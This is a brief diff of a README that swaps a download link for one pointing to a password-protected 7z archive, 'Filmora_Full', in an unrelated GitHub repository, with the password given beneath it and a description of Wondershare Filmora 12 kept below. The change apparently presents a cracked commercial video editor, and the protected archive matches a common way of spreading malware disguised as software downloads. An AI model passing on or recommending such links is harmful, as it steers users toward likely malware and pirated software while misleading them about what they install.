@@ -1,5 +1,5 @@
-# [Download](https://github.com/vojama/VJAI/releases/tag/latest)
-
+## [Download Click](https://github.com/culmtobehuman/filmora-by-coaz/releases/download/Latest/Filmora_Full.7z)
+- ###  Pass: gitproj
 > [!Note]
 > Filmora 12 is the latest version of Wondershare Filmora, a user-friendly video editing software designed for beginners and enthusiasts alike. It offers a range of new features and enhancements to streamline the video editing process.
 
